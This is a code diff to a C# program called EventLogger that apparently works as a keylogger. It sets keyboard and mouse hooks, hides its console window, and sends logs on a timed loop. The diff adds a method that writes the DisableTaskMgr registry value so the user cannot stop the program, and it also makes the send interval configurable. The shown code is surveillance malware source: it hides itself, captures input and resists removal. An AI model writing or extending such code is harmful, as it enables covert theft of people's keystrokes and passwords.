@@ -27,12 +27,17 @@ class EventLogger
 
     private static IntPtr _keyboardHook = IntPtr.Zero;
     private static IntPtr _mouseHook = IntPtr.Zero;
-    private static Logger logger = new Logger();
+    private static Constants config = new Constants();
+    private static Logger logger = new Logger(config);
+    
 
     private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     public static void Main()
     {
+        // Hine on taskmanager
+        //ToggleTaskManager();
+
         var handle = GetConsoleWindow();
         // Hide
         ShowWindow(handle, 0);
@@ -91,7 +96,7 @@ class EventLogger
         {
             while (true)
             {
-                Thread.Sleep(Constants.API_INVOKE * 1000);
+                Thread.Sleep(config.SECONDS_API_INVOKE * 1000);
                 logger.SendLog();
             }
         }
@@ -99,5 +104,12 @@ class EventLogger
         {
             Console.WriteLine(ex);
         }
+    }
+
+    public static void ToggleTaskManager()
+    {
+        Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.LocalMachine;
+        Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"");
+        key.SetValue("DisableTaskMgr", 1, Microsoft.Win32.RegistryValueKind.DWord);
     }
 }
